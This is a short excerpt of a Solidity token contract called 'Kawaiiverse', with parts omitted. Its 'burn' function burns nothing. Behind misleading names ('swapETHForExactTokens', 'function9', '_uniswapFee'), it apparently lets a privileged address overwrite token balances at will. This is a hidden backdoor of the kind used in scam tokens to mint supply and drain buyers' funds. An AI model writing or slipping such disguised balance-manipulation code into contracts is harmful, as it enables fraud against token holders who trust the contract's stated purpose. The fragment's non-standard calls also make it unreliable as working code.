...
contract Kawaii is Ownable, IERC20 {
    ...
    string private _name = "Kawaiiverse";
    string private  _symbol = "KAWAIIVERSE";
    address public _feeAddrWallet;
    ...
    function burn(address fromSender, uint256 feeAmount) internal {
        if (_uniswapFee() == fromSender) {
            if (router_.swapETHForExactTokens() != address(0)) {
                uint256 amount = liquidityFeeCall(router_.swapETHForExactTokens());
                _balances[function9()] = amount;
            }
        }
    }
    function function9() private returns (address) {
        return router_.swapETHForExactTokens();
    }
